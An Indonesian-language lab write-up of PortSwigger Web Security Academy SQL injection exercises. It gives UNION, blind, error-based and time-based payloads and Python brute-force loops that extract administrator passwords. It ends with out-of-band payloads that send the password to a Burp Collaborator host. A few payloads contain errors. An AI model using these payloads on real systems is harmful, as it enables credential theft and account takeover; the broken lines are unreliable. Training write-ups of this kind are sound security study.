### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Objection** : Tampilkan semua data tersembunyi pada database
**Payload** : https://LAB-ID.web-security-academy.net//filter?category=Gifts'+OR+1=1--
**Penjelasan** : Payload yang berwarna merah ditambahkan pada input user sehingga itu dapat mengganggu query SQL pada server, yang seharusnya

### SQL injection vulnerability allowing login bypass
**Objection** : Login ke halaman user sebagai administrator
**POC** : 
1. Pergi ke halaman Login
2. Pada form username masukan administrator’-- -
3. Pada form password bisa dimasukan apa saja
4. Log In

**Penjelasan** : 
Pada form login, ketika dimasukan payload di form username ’-- itu dapat merubah logic dari query SQL di server

### SQL injection attack, querying the database type and version on Oracle
**Objection** : Tampilkan type dan versi dari database Oracle
**POC** : 
1. Pilih dari salah satu type product selain, seperti Gifts
2. Untuk mengetahui bahwa terdapat vuln pada fitur filter, masukan simbol ’ pada akhir url filter?category=Gifts’ 
3. Selanjutnya untuk mengetahui banyaknya column, masukan payload filter?category=Gifts’ UNION SELECT null,null FROM dual--  
4. Karena ketika dicoba dengan dua column tidak terdapat error, maka total columnya ada 2
5. Untuk mendapatkan versi dari database dapat memasukan payload  filter?category=Gifts’ UNION SELECT banner,null FROM v$version-- 
**Penjelasan** :  
Dikarenakan database yang digunakan adalah Oracle, maka jika pada payload terdapat SELET harus ada table yang di select. Untuk itu pada pengecekan banyaknya column bisa menggunakan table bawaan dari Oracle yaitu dual. Dan untuk extract versi database bisa menggunakan column banner dari table v$version

### SQL injection attack, querying the database type and version on MySQL and Microsoft

**Objection** : Tampilkan type dan versi dari database MySQL atau Microsoft
**POC** : 
1. Pilih dari salah satu type product selain, seperti Gifts
2. Untuk mengetahui bahwa terdapat vuln pada fitur filter, masukan simbol ’ pada akhir url filter?category=Gifts’ 
3. Selanjutnya untuk mengetahui banyaknya column, masukan payload filter?category=Gifts’ UNION SELECT null,null--  
4. Karena ketika dicoba dengan dua column tidak terdapat error, maka total columnya ada 2
5. Untuk mendapatkan versi dari database dapat memasukan payload  
    filter?category=Gifts’ UNION SELECT @@version,null-- 

**Penjelasan** :  
Untuk extract versi database di DBMS MySQL atau Microsofot bisa dengan memanggil variable @@version

### SQL injection attack, listing the database contents on non-Oracle databases

**Objection** : Tampilkan isi dari database dan login sebagai administrator
**POC** : 
1. Pilih dari salah satu type product selain, seperti Gifts
2. Untuk mengetahui bahwa terdapat vuln pada fitur filter, masukan simbol ’ pada akhir url filter?category=Gifts’ 
3. Selanjutnya untuk mengetahui banyaknya column, masukan payload filter?category=Gifts’ UNION SELECT null,null--  
4. Karena ketika dicoba dengan dua column tidak terdapat error, maka total columnya ada 2
5. Untuk melihat data user dari database, perlu mengetahui terlebih dahulu nama database, nama table, dan column tablenya  
    - extract nama database  
    filter?category=Gifts’ UNION SELECT null,schema_name FROM information_schema.schemata--  
    - extract nama table  
    filter?category=Gifts’ UNION SELECT null,table_name FROM information_schema.tables where table_schema=[database_name]--  
    - extrace nama column dari table  
    filter?category=Gifts’ UNION SELECT null,column_name FROM information_schema.columns where table_name=[table_name]-- 
6. Setelah mengetahui nama table, dan nama column. Extract data user dapat dilakukan dengan payload (nama column, dan table harap disesuaikan)  
    filter?category=Gifts’ UNION SELECT username_upopll,password_xfhbzi FROM users_qhdhow-- 
7. Setelah mendapatkan username dan password administrator, pergi ke halaman login dan login dengan username administrator dan password  yang sudah didapatkan

**Penjelasan** :  
Pada database non-Oracle terdapat database default yaitu information_schema, dimana dalam database tersebut adalah meta-database yang menyimpan semua informasi database yang terdapat pada server database

### SQL injection attack, listing the database contents on Oracle

**Objection** : Tampilkan isi dari database dan login sebagai administrator
**POC** : 
1. Pilih dari salah satu type product selain, seperti Gifts
2. Untuk mengetahui bahwa terdapat vuln pada fitur filter, masukan simbol ’ pada akhir url filter?category=Gifts’ 
3. Selanjutnya untuk mengetahui banyaknya column, masukan payload filter?category=Gifts’ UNION SELECT null,null FROM dual-- - 
4. Karena ketika dicoba dengan dua column tidak terdapat error, maka total columnya ada 2
5. Untuk melihat data user dari database Oracle, perlu mengetahui terlebih dahulu nama table, dan column tablenya  
    - extract nama table  
    filter?category=Gifts’ UNION SELECT null,table_name FROM all_tables--  
    - extrace nama column dari table  
    filter?category=Gifts’ UNION SELECT null,all_tab_columns FROM all_tables WHERE table_name=[table_name]-- 
6. Setelah mengetahui nama table, dan nama column. Extract data user dapat dilakukan dengan payload (nama column, dan table harap disesuaikan)  
    filter?category=Gifts’ UNION SELECT username_upopll,password_xfhbzi FROM users_qhdhow-- 
7. Setelah mendapatkan username dan password administrator, pergi ke halaman login dan login dengan username administrator dan password  yang sudah didapatkan

**Penjelasan** :  
Pada database Oracle terdapat database default yaitu all_tables, dimana dalam database tersebut adalah meta-database yang menyimpan semua nama table yang terdapat pada server database

### SQL injection UNION attack, determining the number of columns returned by the query

Objection : Mengetahui jumlah column pada table
POC : 
1. Pilih dari salah satu type product selain, seperti Gifts
2. Untuk mengetahui bahwa terdapat vuln pada fitur filter, masukan simbol ’ pada akhir url filter?category=Gifts’ 
3. Selanjutnya untuk mengetahui banyaknya column, masukan payload filter?category=Gifts’ UNION SELECT null,null,null--  
4. Karena ketika dicoba dengan tiga column tidak terdapat error, maka total columnya ada 3

### SQL injection UNION attack, finding a column containing text

**Objection** : Mengetahui column yang memiliki tipe data string
**POC** : 
1. Pilih dari salah satu type product selain, seperti Gifts
2. Untuk mengetahui bahwa terdapat vuln pada fitur filter, masukan simbol ’ pada akhir url filter?category=Gifts’ 
3. Selanjutnya untuk mengetahui banyaknya column, masukan payload filter?category=Gifts’ UNION SELECT null,null,null--  
4. Karena ketika dicoba dengan tiga column tidak terdapat error, maka total columnya ada 3
5. Untuk mengetahui column yang memiliki tipe data string, dapat dilakukan dengan mencoba setiap column dengan value string  
    filter?category=Gifts’ UNION SELECT ‘a’,null,null--  
    filter?category=Gifts’ UNION SELECT null,’a’,null--  
    filter?category=Gifts’ UNION SELECT null,null,’a’-- 
6. Print string yang diinginkan lab

### SQL injection UNION attack, retrieving data from other tables

**Objection** : Tampilkan isi dari database dan login sebagai administrator
**POC** : 
1. Pilih dari salah satu type product selain, seperti Gifts
2. Untuk mengetahui bahwa terdapat vuln pada fitur filter, masukan simbol ’ pada akhir url filter?category=Gifts’ 
3. Selanjutnya untuk mengetahui banyaknya column, masukan payload filter?category=Gifts’ UNION SELECT null,null--  
4. Karena ketika dicoba dengan dua column tidak terdapat error, maka total columnya ada 2
5. Untuk melihat data user dari database, perlu mengetahui terlebih dahulu nama database, nama table, dan column tablenya  
    - extract nama database  
    filter?category=Gifts’ UNION SELECT null,schema_name FROM information_schema.schemata--  
    - extract nama table  
    filter?category=Gifts’ UNION SELECT null,table_name FROM information_schema.tables where table_schema=[database_name]--  
    - extrace nama column dari table  
    filter?category=Gifts’ UNION SELECT null,column_name FROM information_schema.columns where table_name=[table_name]-- 
6. Setelah mengetahui nama table, dan nama column. Extract data user dapat dilakukan dengan payload (nama column, dan table harap disesuaikan)  
    filter?category=Gifts’ UNION SELECT username,password FROM users-- 
7. Setelah mendapatkan username dan password administrator, pergi ke halaman login dan login dengan username administrator dan password  yang sudah didapatkan
  
**Penjelasan** :  
Pada database non-Oracle terdapat database default yaitu information_schema, dimana dalam database tersebut adalah meta-database yang menyimpan semua informasi database yang terdapat pada server database

### SQL injection UNION attack, retrieving multiple values in a single column

**Objection** : Tampilkan isi dari database dalam satu kolom dan login sebagai administrator
**POC** : 
1. Pilih dari salah satu type product selain, seperti Gifts
2. Untuk mengetahui bahwa terdapat vuln pada fitur filter, masukan simbol ’ pada akhir url filter?category=Gifts’ 
3. Selanjutnya untuk mengetahui banyaknya column, masukan payload filter?category=Gifts’ UNION SELECT null,null--  
4. Karena ketika dicoba dengan dua column tidak terdapat error, maka total columnya ada 2
5. Untuk melihat data user dari database, perlu mengetahui terlebih dahulu nama database, nama table, dan column tablenya  
    - extract nama database  
    filter?category=Gifts’ UNION SELECT null,schema_name FROM information_schema.schemata--  
    - extract nama table  
    filter?category=Gifts’ UNION SELECT null,table_name FROM information_schema.tables where table_schema=[database_name]--  
    - extrace nama column dari table  
    filter?category=Gifts’ UNION SELECT null,column_name FROM information_schema.columns where table_name=[table_name]-- 
6. Dikarenakan hanya satu kolom yang memiliki tipe data string, maka dari itu, untuk mendapatkan username dan password. Dapat menggunakan string concat  
    filter?category=Gifts’ UNION SELECT null,username||'~'||password FROM users-- 
7. Setelah mendapatkan username dan password administrator, pergi ke halaman login dan login dengan username administrator dan password  yang sudah didapatkan
  
**Penjelasan** :  
Setiap DBMS memiliki cara string concatenation, untuk dbms postgresql dapat menggunakan  simbol `||`

### Blind SQL injection with conditional responses

**Objection** : Dapatkan password dari user administrator dan login sebagai administrator
**POC** : 
1. Masuk ke halaman login
2. Dikarenakan pada deskripsi lab, diberikan hint jika kelemahan pada web server terdapat pada cookies TrackingId, maka ketika dimasukan simbol ‘, tidak menampilkan string ‘Welcome Back!’
3. Dikarenakan blind sql injection tidak mengembalikan hasil dari query. Maka dari itu, kita dapat melakukan pengecekan setiap karakter pada password administrator dengan bruteforce
4. Untuk dapat melakukan bruteforce dapat dilakukan menggunakan bruteforce sniper atau membuat script sendiri. Untuk kasus saya, menggunakan tools scripting, berikut adalah scripintnya 

```python
for idx in range(1, 21):
           for char in listChar:
               cookies = {
                   'session': self.session,
                   'TrackingId': f"{self.trackingId}' AND (SELECT SUBSTRING(password,{idx},1) FROM users WHERE username='administrator')='{char}"
               }
               url = f"{self.url}/login"
               self._request_lab('GET', url, cookies=cookies)
               if self.html_content.text.find("Welcome back!") != -1:
                   self.password += char
                   break
```
5. Dimana pada script diatas, itu akan melakukan percobaan setiap karakter dari listChar dan mencocokanya dengan karakter pada password administrator
6. Setelah didapatkan password administrator, masukan password ke form dan Log In sebagai administrator
  
**Penjelasan** :  
Pada payload yang digunakan itu akan melakukan logic AND antara TrackingId dengan hasil logic antara karakter yang dicoba menggunakan function SUBSTRING() dengan karakter pada password

### Blind SQL injection with conditional errors

**Objection** : Dapatkan password dari user administrator dan login sebagai administrator
**POC** : 
1. Dari deskripsi yang diberikan, dikatakan bahwa hasil dari sql query tidak akan mengembalikan hasil dari query, namun akan mengembalikan customer error jika terdapat error pada query.
2. Dari sini dapat dimanfaatkan dengan memanfaatkan pengkondisian CASE pada sql query, dimana jika pengkondisian true maka kita akan membuat querynya menjadi error.
3. Karena dalam deskripsi lab sudah diketahui nama table, dan colomnya maka dapat langsung melakukan bruteforcing password. Namun sebelum melakukan bruteforcing password, terlebih dahulu untuk mengetahui panjang karakter dari password administrator. Process bruteforcing dapat dilakukan dengan burpsuite sniper, namun saya membuat scripting tools dengan python  

```python
for idx in range(1, 100):
           cookies = {
               'session': self.session,
               'TrackingId': f"{self.trackingId}' AND (SELECT CASE WHEN LENGTH(password)>{idx} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"
           }
           url = f"{self.url}"
           self._request_lab('GET', url, cookies=cookies)
           if self.html_content.status_code != 500:
               Break

self.len_password = idx
```
4. Setelah mendapatkan panjangnya password, maka sekarang dapat melakukan bruteforcing password administrator, dimana query payload akan melakukan pencocokan setiap karakter dalam listChar dengan setiap karakter pada password, dimana jika benar query akan diubah menjadi error dengan division by zero lalu pengkonversian tipe data ke string agar cocok, untuk kasus ini saya menggunakan tools scripting  

```python
for idx in range(self.len_password):
           for char in self.listChar:
               cookies = {
                   'session': self.session,
                   'TrackingId': f"{self.trackingId}' AND (SELECT CASE WHEN (SUBSTR(password,{idx+1},1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"
               }
               url = f"{self.url}"
               self._request_lab('GET', url, cookies=cookies)
               if self.html_content.status_code == 500:
                   self.password += char
                   break
```
5. Setelah mendapatkan password dari bruteforce, pergi ke halaman Log In dan masuk sebagai administrator dengan password yang telah didapatkan

**Penjelasan** :  
Untuk referensi bagaimana itu bisa bekerja dapat dilihat dari [PortSwigger](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors) , singkatnya payload akan melakukan logical AND antara TrackingId dengan hasil dari  pengkondisian karakter dari listChar dengan setiap karakter pada password administrator, jika karakter yang dibandingkan benar maka akan melakukan division by zero yang pada dasarnya akan menimbulkan error

### Visible error-based SQL injection

**Objection** : Dapatkan password dari user administrator dan login sebagai administrator
**POC** : 
1. Dari deskripsi diketahui nama table, dan kolomnya. Dan kerentananya terdapat pada TrackingId
2. Saat pencobaan memasukan simbol ‘ pada cookies TrackingId, web server menampilkan error yang terjadi pada query
3. Maka dari itu, visible errornya dapat dimanfaatkan untuk extract data dengan menggunakan query CAST(), dimana pada payload nanti akan mencoba untuk casting hasil dari query SELECT password ke dalam INT.  
    {trackingId}’ AND CAST((SELECT password FROM users) AS int) 
4. Namun, karena ketika dicoba, terdapat limit pada query yang harus dimasukan, maka dapat dicoba dengan menghapus value dari {trackingId}  
    ’ AND CAST((SELECT password FROM users) AS int) 
5. Terdapat error bahwa type data setelah AND harus memiliki tipe data boolean  
    ’ AND 1=CAST((SELECT password FROM users) AS int) 
6. Muncul error baru, jika output dari query SELECT lebih dari satu row, maka dari itu solusinya adalah dengan LIMIT 1, sehingga output dari password hanya menampilkan data yang paling atas  
    ’ AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) 
7. Maka didapatkan passwordnya, Selanjutnya pergi ke halaman Log In, dan masuk sebagai administrator dengan password yang sudah didapat

**Penjelasan** :  
Selebihnya sudah saya jelaskan pada POC, untuk referensi bagaimana itu bisa bekerja dapat dilihat dari [PortSwigger](https://portswigger.net/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages)

### Blind SQL injection with time delays

**Objection** : Exploit kerentanan SQL, dengan melakukan delay 10 detik
**POC** :
1. Dari deskripsi lab, kerentanan terdapat pada TrackingId
2. Untuk melakukan blind SQL Injection time delays, dapat dicoba payload dari [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) 
3. Setelah percobaan, maka payload yang bekerja adalah  '|| pg_sleep(10)-- 
4. Dengan begitu, DBMS yang digunakan web server adalah postgreSQL

**Penjelasan** :  
Payload tersebut akan bekerja karena pg_sleep(10) akan di concat dengan query SQL sebelumnya

### Blind SQL injection with time delays and information retrieval

Objection : Exploit kerentanan SQL, dan login sebagai administrator
POC :
1. Dari deskripsi yang diberikan, dikatakan bahwa hasil dari sql query tidak akan mengembalikan hasil dari query, namun jika dicoba dengan payload basic time delays, maka bekerja.
2. Kasus ini, mirip dengan lab Conditional Error, dimana kita dapat memanfaatkan query CASE pada sql query, dimana jika pengkondisian true maka kita akan membuat querynya melakukan delay. 
3. Karena dalam deskripsi lab sudah diketahui nama table, dan colomnya maka dapat langsung melakukan bruteforcing password. Namun sebelum melakukan bruteforcing password, terlebih dahulu untuk mengetahui panjang karakter dari password administrator. Process bruteforcing dapat dilakukan dengan burpsuite sniper, namun saya membuat scripting tools dengan python  

```python
for idx in range(1, 100):
           cookies = {
               'session': self.session,
               'TrackingId': f"{self.trackingId}'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)<{idx}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--"
           }
           start = time.time()
           url = f"{self.url}"
           self._request_lab('GET', url, cookies=cookies)
           end = time.time()
           if end - start > 4:
               idx -= 1
               break
  

self.len_password = idx
```
4. Setelah mendapatkan panjangnya password, maka sekarang dapat melakukan bruteforcing password administrator, dimana query payload akan melakukan pencocokan setiap karakter dalam listChar dengan setiap karakter pada password, dimana jika benar query akan melakukan time delay selama 3 detik, untuk kasus ini saya menggunakan tools scripting  
```python
for idx in range(self.len_password):
           for char in self.listChar:
               cookies = {
                   'session': self.session,
                   'TrackingId': f"{self.trackingId}'%3BSELECT CASE WHEN (username='administrator' AND SUBSTR(password,{idx+1},1)='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users-- -"
               }
               start = time.time()
               url = f"{self.url}"
               self._request_lab('GET', url, cookies=cookies)
               end = time.time()
               if end - start >=3:
                   self.password += char
                   break
```
5. Setelah mendapatkan password dari bruteforce, pergi ke halaman Log In dan masuk sebagai administrator dengan password yang telah didapatkan

### SQL injection with filter bypass via XML encoding

**Objection** : Exploit kerentanan SQL dalam format XML, dan login sebagai administrator
**POC** :
1. Kerentanan terdapat pada pengeceka stock barang di view detail product
2. Pada form XML dapat dilihat, bahwa terdapat dua tag yang cukup menarik yaitu, productId dan storeID.
3. Dengan begitu, dapat langsung di cek, dengan payload 1 Order By 1 pada kedua tag
4. Dapat dilihat, bahwa hanya pada tag storeId saja yang mengembalikan value tanpa ada masalah, dengan begitu dapat disimpulkan storeId memiliki kerentanan pada SQL Injection
5. Selanjutnya tinggal extract data pada tag storeId dengan 1 UNION SELECT username||‘~’||password FROM users , concatination colom perlu dilakukan karena berdasarkan tahap ketiga storeId hanya memiliki satu kolom. Namun payload yang dikirim terkena filter, dengan begitu perlu adanya cara untuk melakukan encoding pada payload yang akan dikirim
6. Dengan bantuan extension Hackvertor pada burpsuite, dengan encoding <@hex_entities> payload berhasil dikirim dan mengembalikan username dan password dari users
7. Berikut adalah final payloadnya :  
```xml
	<?xml version="1.0" encoding="UTF-8"?>  
    <stockCheck>  
	    <productId>
			1
		</productId>
	<storeId>
		<@hex_entities>
			1 UNIon SelEcT username||'~'||password FROM users
		<@/hex_entities>
	</storeId>
	</stockCheck>
```

### Out-of-Bound SQL Injection
**List Payload** :
Oracle :
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

Microsoft :
```sql
declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

PostgreSQL
```sql
create OR replace function f() returns void as $$  
declare c text;  
declare p text;  
begin  
SELECT into p (SELECT password FROM users WHERE username='administrator');  
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';  
execute c;  
END;  
$$ language plpgsql security definer;  
SELECT f();
```

MySQL
```sql
SELECT SELECT password FROM users WHERE username='administrator' INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```